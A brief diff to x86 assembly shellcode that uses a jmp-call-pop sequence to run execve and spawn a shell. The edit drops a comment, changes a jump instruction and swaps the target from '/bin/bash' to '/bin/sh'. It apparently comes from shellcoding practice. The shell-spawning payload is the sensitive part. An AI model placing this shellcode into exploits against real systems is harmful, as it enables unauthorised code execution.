@@ -12,10 +12,8 @@ _start:
  	xor ebx, ebx
  	mul ebx
 
- 	; ecx doesn't have to contain any information right now
  	xor ecx, ecx
-
- 	jmp short bin_bash
+ 	jmp bin_bash
 
  execve_rt:
  	pop ebx
@@ -25,4 +23,4 @@ _start:
 
  bin_bash:
  	call execve_rt
- 	message db "/bin/bash", 0x0
+ 	message db "/bin/sh", 0x0
